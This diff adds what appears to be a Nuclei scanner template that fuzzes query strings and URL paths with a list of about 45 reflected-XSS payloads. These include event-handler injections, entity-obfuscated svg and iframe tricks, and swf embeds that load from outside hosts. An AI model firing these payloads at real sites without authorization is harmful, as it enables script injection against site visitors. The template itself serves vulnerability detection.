@@ -1,0 +1,101 @@
+
+id: reflected-xss
+
+info:
+  name: Reflected Cross-Site Scripting
+  author: pdteam,0xKayala,AmirHossein Raeisi
+  severity: medium
+  metadata:
+    max-request: 1
+  tags: xss,rxss,dast
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+
+    payloads:
+      reflection:
+        - "<picture onmouseover=\"alert(1)\">test</picture>"
+        - "<input onkeydown=\"alert(1)\" contenteditable>test</input>"
+        - "<audio onkeyup=\"alert(1)\" contenteditable>test</audio>"
+        - "<iframe/src=\"data:text/html,<svg&#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&#1064;url%3d,javascript:alert(1)</script>"
+        - "<audio autoplay controls ontimeupdate=alert(1)><source src=&quot;validaudio.wav&quot; type=&quot;audio/wav&quot;></audio>"
+        - "<script>javascript:alert(1)</script"
+        - "<audio onpause=alert(1) autoplay controls autoplay controls></audio>"
+        - "<canvas oncopy=\"alert(1)\" contenteditable>test</canvas>"
+        - "<xmp onload=alert(1)"
+        - "<iframe/src=onload=alert(1)>"
+        - "<iframe srcdoc=<!--&#115;&#101;&#99;-->&#115;&#101;&#107;/&#115;&#101;&#99;-->"
+        - "<canvas id=x oncontextmenu=alert(1)></canvas>"
+        - "<script>alert('xss');</script>"
+        - "<iframe src=\"data:text/html,&lt;IMG SRC=&quot;x&quot;&gt;\">"
+        - "<style>@keyframes slidein {}</style><time style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></time>"
+        - "&lt;s&gt;"
+        - "<body onload=alert(1);>"
+        - "<IMG SRC=x onmouseover=alert(String.fromCharCode(88,83,83))\">"
+        - "<html xmlns=\"http://w3.org/1999/xhtml\" xmlns:xlink=\"http://w3.org/1999/xlink/stylesheet\">"
+        - "<style>:target {color:red;}</style><button id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></button"
+        - "<style>@keyframes slidein {}</style><object style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></object>"
+        - "<iframe/src=\"data:text/html,&lt;script&gt;javascript&#58;alert(1)&lt;/script&gt;\"></iframe>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click"
+        - "<object id=x classid='clsid:0022081D-0000-0000-0000-00805F4C114B'></object><param name=wmode onerror=javascript:alert(1)></param>"
+        - "<multicol onpaste=\"alert(1)\" contenteditable>test</multicol>"
+        - "<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always"
+        - "<marquee onbeforecut=\"alert(1)\" contenteditable>test</marquee>"
+        - "<body onload=alert(1)>"
+        - "<embed src=\"http://ha.ckers.org/xss.swf\" allowScriptAccess=\"always\"></embed>"
+        - "<marquee style=\"behavior:url('#default#time2');\" oncomplete=\"alert(1)\">"
+        - "<div style=\"x:\\expression(javascript:alert(1))\">"
+        - "<IMG SRC=x onkeydown=\"alert(String.fromCharCode(88,83,83))\">"
+        - "<html onmouseenter=\"alert(1)\">test</html>"
+        - "<script>alert(1)</script>"
+        - "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script>"
+        - "<div draggable=\"true\" contenteditable>drag me</div><img ondragover=alert(1) contenteditable>drop here</img>"
+        - "<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdo>"
+        - "<object type=\"text/x-scriptlet\" data=\"http://jsfiddle.net/XLE63/ \"></object>
+<meta http-equiv=\"refresh\" content=\"0;javascript&#110;&#111;&#114;&#115;&#116;&#117;&#118;&#119;&#120;&colon;alert(1)\"/>
+<math><a xlink:href=\"//jsfiddle.net/t846h/\">click
+<embed code=\"http://businessinfo.co.uk/labs/xss/xss.swf\" allowscriptaccess=always>"
+        - "<picture onmouseleave=\"alert(1)\">test</picture"
+        - "<iframe/src=\"data:text/html,<svg &#111;&#110;load=alert(1)>\">
+<meta content=\"&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)\" http-equiv=\"refresh\"/>
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script"
+        - "<script>alert(1)</script>"
+        - "<iframe srcdoc=\"<html><head><title>XSS</title></head><body><h1>XSS</h1></body></html>\" >"
+        - "<style>@keyframes x{}</style><noscript style=\"animation-name:x\" onanimationstart=alert(1)></noscript>"
+        - "<nobr onbeforecut=\"alert(1)\" contenteditable>test</nobr>"
+
+    fuzzing:
+      - part: query
+        type: postfix
+        mode: single
+        fuzz:
+          - "{{reflection}}"
+
+      - part: path
+        type: postfix
+        mode: single
+        fuzz:
+          - "?name={{reflection}}"
+
+    stop-at-first-match: false
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "{{reflection}}"
+
+      - type: word
+        part: header
+        words:
+          - "text/html"
+        
